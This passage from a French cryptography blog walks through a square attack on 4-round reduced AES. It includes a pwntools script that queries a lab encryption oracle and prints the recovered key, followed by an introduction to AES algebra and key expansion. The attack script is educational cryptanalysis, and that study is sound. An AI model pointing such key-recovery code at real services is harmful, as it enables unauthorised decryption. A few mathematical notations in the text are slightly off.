    <figure><img src="https://dilagluc.github.io/crypto_aes/delta_ShiftRows.png"/></figure></li>
<li>MixColumns


    <figure><img src="https://dilagluc.github.io/crypto_aes/delta_MixColumns.png"/></figure></li>
</ul>
<p>A la fin du 1er tour, on obtient donc toujours un \(\Lambda\)-set avec 4 indices actifs. A la fin du 2ème tour, on obtient un \(\Lambda\)-set avec tous les indices qui sont actifs. Le MixColumns du 3ème tour détruit notre \(\Lambda\)-set.


    <figure><img src="https://dilagluc.github.io/crypto_aes/delta_3tours.png"/></figure>.
Comme on peut le voir en image notre \(\Lambda\)-set est détruit à la sortie du MixColumns du 3ème tour.<br>
Imaginons donc qu&rsquo;on prend  l&rsquo;indice \((i,j)\) de tous les états de notre \(\Lambda\)-set détruit juste après le MixColumns et appliquons un XOR entre eux tous. On constate que le résultat de ce XOR est \(0\). En effet:<br>
Avant l&rsquo;entrée dans le MixColumns on a un \(\Lambda\)-set, désignos par \(a_{ij}\) l&rsquo;octet à la position \(j\) de l&rsquo;état \(i\) Rappelons nous du fonctionnement du MixColumns. il transforme une colonne  </p>
$$\begin{bmatrix}
a_0 \\\\
a_1 \\\\
a_2 \\\\
a_3 \\\\
\end{bmatrix}$$
<p>
en </p>
$$\begin{bmatrix}
2a_0+3a_1+1a_2+1a_3 \\\\
1a_0+2a_1+3a_2+1a_3 \\\\
1a_0+1a_1+2a_2+3a_3 \\\\
3a_0+1a_1+1a_2+2a_3 \\\\
\end{bmatrix} $$
<p>
Et donc dans notre cas on a :


    <figure><img src="https://dilagluc.github.io/crypto_aes/xor1.png"/></figure>
Et qui se simplifie par:


    <figure><img src="https://dilagluc.github.io/crypto_aes/xor2.png"/></figure>
On a donc une relation entre les éléments de notre \(\Lambda\)-set. On dit alors que la sortie du 3ème tour est équilibrée.</p>
<h4 id="attaquer-laes-à-4-tours">Attaquer l&rsquo;AES à 4 tours<a href="#attaquer-laes-%c3%a0-4-tours" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>A la fin du 3ème tour, an a donc une relation entre les éléments de notre \(\Lambda\)-set. En ajoutant un tour de plus, on constate que notre observation n&rsquo;est plus vraie après le SubBytes.


    <figure><img src="https://dilagluc.github.io/crypto_aes/unknown.png"/></figure>
On voit là en bleu que le SubByte casse notre structure en rouge.<br>
Mais imaginons qu&rsquo;on essaye de deviner un octet à la position \(i\) de la dernière sous-clé.<br>
Concentrons nous sur cette position \(i\) de tous les 256 états. On fait l&rsquo;inverse du AddRoundKey qui est lui même, celui-ci agira sur cette position uniquement sans l&rsquo;influencer avec d&rsquo;autres octets, pareil pour l&rsquo;inverse du ShiftRows et l&rsquo;inverse du SubBytes. A la sortie de l&rsquo;inverse du SubBytes, on se retrouve dans l&rsquo;état où on avait fait notre constat. Et notre constat devrait toujours être valide à ce stade. Il suffit donc une fois à cette étape de faire le XOR de tous les octets à la position \(i\) de tous les 256 états à cette position et de vérifier si on obtient \(0\). Si oui, alors ça veut dire qu&rsquo;on a obtenu la bonne dernière sous-clé. On peut donc itérer ce processus et trouver la dernière sous-clé octet par octet. Cependant il peut y avoir des faux positifs. On peut avoir pour un même \(\Lambda\)-set plusieurs octets qui répondent aux critères de l&rsquo;octet qu&rsquo;on essaye de deviner. Dans ce cas, il faudra changer de \(\Lambda\)-set et tester ces octets afin d&rsquo;éliminer les faux positifs.<br>
Vous pouvez trouver une implémentation assez complète ici:  <a href="https://github.com/thomasperrot/aes-square-attack">https://github.com/thomasperrot/aes-square-attack</a>.<br>
On peut le tester. Comme dit dans le README, on va implémenter la fonction dont la signature est <code>def encrypt_delta_set(delta_set: Iterable[State]) -&gt; List[State]:</code>, elle permettra de chiffrer les \(\Lambda\)-set qui lui seront envoyés en paramètre.<br>
Ici, on dispose d&rsquo;un oracle de chiffrement qui implémente un AES-128 réduit à 4 tours et où on peut chiffrer autant de clair qu&rsquo;on veut.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Users\dilag\Documents\cryptanalysis\aes <span style="color:#ae81ff">4</span> tours\aes-square-attack&gt;ncat <span style="color:#ae81ff">192.168</span>.0.1 <span style="color:#ae81ff">5050</span>
</span></span><span style="display:flex;"><span>Commands are<span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>|-&gt; e &lt;block&gt;   Encrypt the plaintext block with <span style="color:#ae81ff">4</span>-round AES-<span style="color:#ae81ff">128</span>
</span></span><span style="display:flex;"><span>|-&gt; c &lt;block&gt;   Check whether the block is the secret key
</span></span><span style="display:flex;"><span>|-&gt; q           Quit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>e <span style="color:#ae81ff">010000000000000000000000000000000</span>
</span></span><span style="display:flex;"><span>Error<span style="color:#960050;background-color:#1e0010">:</span> the plaintext must contain <span style="color:#ae81ff">32</span> hexadecimal digits ([<span style="color:#ae81ff">0</span>-9a<span style="color:#f92672">-f</span>])
</span></span><span style="display:flex;"><span>e <span style="color:#ae81ff">10000000000000000000000000000000</span>
</span></span><span style="display:flex;"><span>d11335db039b7688924c9d4ad4068051
</span></span></code></pre></div><p>Voici donc notre implémentation utilisant le petit package du github</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> typing <span style="color:#f92672">import</span> Iterable, List
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> aes.common <span style="color:#f92672">import</span> State
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> aes.square <span style="color:#f92672">import</span> crack_key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">global</span> conn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tostate</span>(plaintext<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>):
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(list(plaintext), dtype<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>reshape(state, (<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>), order<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;F&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> state
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt_delta_set</span>(delta_set: Iterable[State]) <span style="color:#f92672">-&gt;</span> List[State]:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> conn
</span></span><span style="display:flex;"><span>    states <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> delta_set:
</span></span><span style="display:flex;"><span>        hex_bytes <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(((bytes(list(np<span style="color:#f92672">.</span>reshape(s, <span style="color:#ae81ff">16</span>, order<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;F&#39;</span>))))))
</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;e &#39;</span> <span style="color:#f92672">+</span> hex_bytes)
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>        states<span style="color:#f92672">.</span>append(tostate(binascii<span style="color:#f92672">.</span>unhexlify(res)))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> states
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:  
</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;192.168.0.1&#39;</span>,<span style="color:#ae81ff">5050</span>)
</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Quit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    cracked_key <span style="color:#f92672">=</span> crack_key(encrypt_delta_set)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Found key: </span><span style="color:#e6db74">{</span>binascii<span style="color:#f92672">.</span>hexlify(cracked_key)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><p>Après exécution :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 192.168.0.1 on port 5050: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found key: b<span style="color:#e6db74">&#39;7473f9bfec7414027c10e4fbcc979c00&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to 192.168.0.1 port <span style="color:#ae81ff">5050</span>
</span></span></code></pre></div><p>Et voilà on a récupérer la clé de chiffrement.</p>
<!-- #### Attaquer l'AES à 5 tours -->
]]></content></item><item><title>Chiffrement AES</title><link>https://dilagluc.github.io/en/posts/2023/crypto/aes/intro-to-aes/</link><pubDate>Sun, 09 Jul 2023 20:32:54 +0200</pubDate><author>dilag</author><guid>https://dilagluc.github.io/en/posts/2023/crypto/aes/intro-to-aes/</guid><description>Introduction au chiffrement AES</description><content type="text/html" mode="escaped"><![CDATA[<p>AES est un chiffrement par bloc basé sur des opérations matricielles. Il existe plusieurs types d&rsquo;implémentation, AES-128, AES-256 etc. et également des modes (ECB, CBC, etc.)</p>
<h2 id="introduction">Introduction<a href="#introduction" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>AES est un chiffrement par blocs qui peut chiffer et déchiffrer pas moins et pas plus de de 128 bits (16 octets) de message en clair. Le message est donc divisé par bloc de 16 octets. Pour pallier à cette limitation, on utilise un mode d&rsquo;opération (ECB, CBC, CTR etc.)  et du padding.
En plus du message en clair de 128 bits, AES utilise également une clé de chiffrement dont la taille peut varier. Ainsi en notant AES-128, on dit indirectement que la clé de chiffrement est de 128 bits. Il existe également AES-192, AES-256 et dont l&rsquo;implémentation diffère légèrement de l&rsquo;AES-128.
Notre objectif ici sera plutôt de se concentrer sur le cœur du chiffrement AES-128 en lui même et non comment l&rsquo;utiliser.
AES est un chiffrement par blocs qui s&rsquo;implémente en plusieurs étapes. Bien que nous verront ici comment il fonctionne et comment c&rsquo;est implémenté, il est fortement déconseillé de faire sa propre implémentation. La raison st toute simple, elle peut être vulnérable. Cela dit, commençons.</p>
<h2 id="1-prérequis-mathématiques">1. Prérequis mathématiques<a href="#1-pr%c3%a9requis-math%c3%a9matiques" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>Certaines transformations AES opèrent sur le corps fini \(GF(2^8)\). Nous verrons d&rsquo;abord comment ce corps est construit et quelques une de ces propriétés.</p>
<h3 id="11-notions-dalgèbre">1.1 Notions d&rsquo;algèbre<a href="#11-notions-dalg%c3%a8bre" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h3>
<h5 id="groupes">Groupes<a href="#groupes" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>Un ensemble \(G\) muni d’une <a href="https://fr.wikipedia.org/wiki/Loi_de_composition_interne">loi interne</a> , notée \(\ast\) par exemple, est appelé un <strong>groupe</strong> ssi cette
loi vérifie les trois axiomes suivants:<br>
• La loi \(\ast\) est associative sur \(G\) i.e. </p>
$$ \forall x, y, z \in G, x\ast(y\ast z) = (x\ast y)\ast z$$
<p>
• La loi \(\ast\) possède un élément neutre dans \(G\) i.e.
</p>
$$\exists e \in G , x\ast e = e\ast x = x $$
<p> On dit alors que \(e\) est l&rsquo;élément neutre de \(G\)</p>
<p>• La loi \(\ast\) est symétrique i.e.
</p>
$$ \forall x \in G, \exists x’ \in G, x\ast x’=x’\ast x=e$$
<p> On dit alors que \(x'\) est le symétrique ou l&rsquo;inverse de \(x\) dans \(G\).</p>
<p>Un tel groupe est noté \((G,\ast)\) (on lit \(G\) muni de la loi de composition interne \(\ast\) ) ou \(G\).<br>
Si de plus la loi \(\ast\) est commutative c&rsquo;est-à-dire pour tout \(x,y \in G\) on a  \(x\ast y = y\ast x\) , alors on dit que \(G\) est un groupe commutatif ou encore un groupe abélien.</p>
<p>Un groupe \(G\) est dit fini si \(card(G)\) est fini où \(card(G)\) c&rsquo;est le nombres d&rsquo;élements de \(G\). Le nombre d’éléments d’un groupe est appelé <strong>ordre</strong> du groupe.</p>
<p>Un sous-ensemble \(H\) d’un groupe G (\(H \subset G\)) est un <strong>sous-groupe</strong> s’il est lui-même un groupe pour les opérations de \(G\).</p>
<h5 id="anneaux">Anneaux<a href="#anneaux" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>Un <strong>anneau</strong> \((R,+,\ast)\) est un ensemble \(R\) munis de deux opérations binaires notées \(+\) et \(\ast\) telles que:</p>
<ul>
<li>\((R,+)\) est un groupe abélien (dont l’identité (ie l&rsquo;élément neutre) est notée \(0\) ou \(0_R\))</li>
<li>La loi \(\ast\) est associative sur \(R\)</li>
<li>Il existe un élément de \(R\), noté \(1\), ou \(1_R\) tel que pour tout \(a\) dans R, \(a\ast 1=1\ast a=a\)</li>
<li>La loi \(\ast\) est distributive par rapport à la loi \(+\) i.e. \(a\ast (b+c) = (a\ast b)+(a\ast c) et (b+c)\ast a = (b\ast a)+(c\ast a)\). <br>
L’anneau est commutatif si la loi \(\ast\)  est commutative sur \(R\).</li>
</ul>
<h5 id="corps">Corps<a href="#corps" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>Un <strong>corps</strong> est un anneau dans lequel tous les éléments non-nuls ont un inverse pour la
multiplication.</p>
<h5 id="anneaux-des-polynômes">Anneaux des polynômes<a href="#anneaux-des-polyn%c3%b4mes" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>Supposons que \(R\) est un anneau commutatif, alors un polynôme en \(x\) sur l&rsquo;anneau \(R\) est une expression de la forme:
</p>
$$ f(x) = a_nx^n + a_{n-1}x^{n-1} + ... + a_1x^1 +a_0$$
<p>
Si \(R\) est un anneau commutatif, l’anneau des polynômes noté \(R[x]\) est l’anneau formé par l’ensemble des polynômes en \(x\) à coefficients dans R.</p>
<p>Soit \(K\) un corps et soit \(f(x)\) un polynôme dans \(K[x]\) de degré au moins 1.
On dit que \(f(x)\) est <strong>irréductible</strong> dans \(K[x]\) s’il ne peut pas se décomposer en produit de deux polynômes de \(K[x]\) dont les degrés sont supérieurs ou égaux à \(1\).<br>
<strong>Exemple</strong>:</p>
<ul>
<li>Tous les polynômes de degré \(1\) sont irréductibles. Par conséquent il y a une infinité de
polynômes irréductibles.</li>
<li>\(X^2−1 = (𝑋 − 1)(𝑋 + 1)\) ∈ \(\mathbb{R}[𝑋]\) est réductible.</li>
<li>\(X^2+1=(X−i)(X+i)\) est réductible dans \(\mathbb{C}[X]\) mais est irréductible dans \(\mathbb{R}[X]\).</li>
<li>\(𝑋^2−2=(X−\sqrt{2})(X+\sqrt{2})\) est réductible dans \(\mathbb{R}[X]\) mais est irréductible dans \(\mathbb{Q}[X]\)</li>
</ul>
<p>\(𝐾[𝑥]/𝑓(𝑥)\) désigne l’ensemble des polynômes de \(K[x]\) dont le degré est inférieur ou égal à \(n=deg(f(x))\). Les opérations d’addition et de multiplication sont effectuées modulo \(f(x)\).<br>
\(𝐾[𝑥]/𝑓(𝑥)\) étant un anneau commutatif,  si \(f(x)\) est irréductible sur \(K\), alors
\(𝐾[𝑥]/𝑓(𝑥)\) est un corps.</p>
<h5 id="corps-finis">Corps finis<a href="#corps-finis" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p><strong>Existence et unicité</strong> : si \(K\) est un corps fini, alors \(K\) contient \(p^n\) éléments où \(p\) est un nombre
premier et \(n\) est un entier strictement positif. Pour tout nombre premier \(p\) et tout entier \(n\), il existe
un unique corps fini (à isomorphisme près) de cardinal \(p^n\) . Ce corps est noté \(\mathbb{F}_{p^n}\).</p>
<h3 id="12-gf28">1.2 \(GF(2^8)\)<a href="#12-gf28" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h3>
<p>\(GF(2^8)\) est un corps fini avec 256 éléments, aussi appelé <strong>corps de Galois</strong> dont
les coefficients sont dans \(F_2\) et de degré inferieur à 8.
Nous pouvons représenter ce corps par l’ensemble:</p>
$$\mathbb{F}_{256} \simeq (\mathbb{F}_2)^8 \simeq \mathbb{F}_2/ (X^8 + X^4 + X^3 + X + 1) $$
$$\underbrace {(X^8 + X^4 + X^3 + X + 1)}_{m(x)} $$
<p>Le polynôme \(m(X)\) est irréductible primitif, ainsi, l’isomorphisme existe bien entre les deux ensembles.</p>
<ul>
<li>Cet objet mathématique est utilisé pour définir la boîte S ou Sbox dans le chiffrement AES (L&rsquo;étape ShiftColumns et la matrice utilisé dans l&rsquo;étape MixColumn)</li>
<li>Chaque élément de \(GF(2^8)\) est représenté comme: \(b_7X^7 + b_6X^6 + … + b_1X^1 + b_0\)</li>
</ul>
<p><strong>Multiplication dans \(GF(2^8)\)</strong><br>
Regardons la multiplication par α. Prenons α, la classe de \(X\), on  a:<br>
</p>
$$ m(\alpha) = \alpha^8 + \alpha^4 + \alpha^3 + \alpha + 1 = 0$$
$$ \Leftrightarrow$$
$$\alpha^8 = \alpha^4 + \alpha^3 + \alpha + 1 $$
<p>
Ainsi, pour appliquer la multiplication de \(\alpha\) par un polynôme en \(\alpha\), il suffira de<br>
remplacer le monôme \(\alpha^8\) par \(\alpha^4 + \alpha^3 +\alpha + 1\).</p>
<h2 id="2--aes---chiffrement">2.  AES - Chiffrement<a href="#2--aes---chiffrement" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<h3 id="21-etendre-la-clé-key-expansion">2.1 Etendre la clé (Key Expansion)<a href="#21-etendre-la-cl%c3%a9-key-expansion" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h3>
<h4 id="211-présentation">2.1.1 Présentation<a href="#211-pr%c3%a9sentation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>Une des transformations utilisé avec l&rsquo;AES est de faire un XOR avec des clés. Un algorithme de cadencement de clé calcule à partir de la clé K une suite de sous-clés de tour comportant toutes 16 octets. Avec l&rsquo;AES-128, on a besoin exactement de générer 11 clés à partir de la clé fourni. Ces clés dérivés de notre clé fournit sont appelées <em>round keys</em> ou <em>subkeys</em>. Le processus de dérivation de clés est appelé <em>key expansion</em> ou <em>key schedule</em>.
Le calcul des sous-clés se fait à partir d’une fonction inversible qui prend en entrée une clé \(K_i\) et un entier et qui sors une clé \(K_{i+1}\) dépendant de \(K_i\).<br>
Soit \(K_0\) la clé initiale et \(K_{i+1}\) la clé calculée par la fonction avec les paramètres \(K_i\) et \(i\),  \(K_i;C_j\) la colonne \(j\) de la clé \(K_i\) et  \(K'\_i\)  la copie de la clé \(K_i\).<br>
La procédure pour calculer \(K_{i+1}\) en fonction de \(K_i\) est :</p>
<ul>
<li>On effectue une rotation de 1 cran vers le haut de \(K'_0 ;C_3\). c&rsquo;est l&rsquo;opération <strong>RotWord</strong></li>
<li>On applique la fonction S-Box (on détaillera dans la suite) sur chaque octets de cette même colonne.  C&rsquo;est l&rsquo;opération <strong>SubWord</strong></li>
<li>On calcule un XOR entre la première valeur de la colonne \(K'_0;C_3\) et Rcon(i). On détaillera également dans la suite le <strong>Rcon(i)</strong></li>
<li>On effectue les XOR successifs suivants :
<ul>
<li>\(K_{i+1};C_0 = K'_i;C_3 \oplus Ki;C0\)</li>
<li>\(K_{i+1};C_1 = K'_i;C_0 \oplus K_i;C_1\)</li>
<li>\(K_{i+1};C_2 = K'i;C_1 \oplus K_i;C_2\)</li>
<li>\(K_{i+1};C_3 = K'_i;C_2 \oplus K_i;C_3\)<br>
En résumé,


    <figure><img src="https://dilagluc.github.io/crypto_aes/key_expansion.png"/></figure></li>
</ul>
</li>
</ul>
<h4 id="212-détails-des-opérations">2.1.2 Détails des opérations<a href="#212-d%c3%a9tails-des-op%c3%a9rations" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<h5 id="rotword">RotWord<a href="#rotword" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>Comme son nom  l&rsquo;indique, c&rsquo;est un décalage circulaire de bas en haut donc il prend une entrée de 4 octets et retourne comme sortie la rotation de ces 4 octets comme ceci.<br>
</p>
$$ \begin{bmatrix}
00 \\\\
01 \\\\
02 \\\\
03 
\end{bmatrix}    \Leftrightarrow  \begin{bmatrix}
01 \\\\
02 \\\\
03 \\\\
00 
\end{bmatrix}$$
<h5 id="subword">SubWord<a href="#subword" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p>Cette transformation consiste à associer à chaque octet en entrée, un unique autre byte en utilisant un mapping appelé <em>Sbox</em>.<br>
Cette <em>Sbox</em> s&rsquo;obtient en :</p>
<ul>
<li>Prenant l&rsquo;inverse multiplicatif de l&rsquo;octet \(X\) dans \(GF(2^8)\)</li>
<li>Appliquer ensuite une transformation affine sur cet inverse
\(Sbox(X) = Affine(Inverse(X))\)
Cette transformation affine, en forme matricielle s&rsquo;exprime par:
$$ \begin{bmatrix}
b'_0 \\\\
b'_1 \\\\
b'_2 \\\\
b'_3 \\\\
b'_4 \\\\
b'_5 \\\\
b'_6 \\\\
b'_7
\end{bmatrix} = \begin{bmatrix}
1&0&0&0&1&1&1&1 \\\\
1&1&0&0&0&1&1&1 \\\\
1&1&1&0&0&0&1&1 \\\\
1&1&1&1&0&0&0&1 \\\\
1&1&1&1&1&0&0&0 \\\\
0&1&1&1&1&1&0&0 \\\\
0&0&1&1&1&1&1&0 \\\\
0&0&0&1&1&1&1&1
\end{bmatrix}
\begin{bmatrix}
b_0 \\\\
b_1 \\\\
b_2 \\\\
b_3 \\\\
b_4 \\\\
b_5 \\\\
b_6 \\\\
b_7
\end{bmatrix} + 
\begin{bmatrix}
1 \\\\
1 \\\\
0 \\\\
0 \\\\
0 \\\\
1 \\\\
1 \\\\
0
\end{bmatrix}
$$
Voici ce qu&rsquo;on obtient:</li>
</ul>


    <figure><img src="https://dilagluc.github.io/crypto_aes/sub.png"/></figure>
<p>Pour lire cette table :</p>
<ul>
<li>les 4 bits les plus significatifs représente la ligne</li>
<li>les 4 bits moins significatifs représentera la colonne<br>
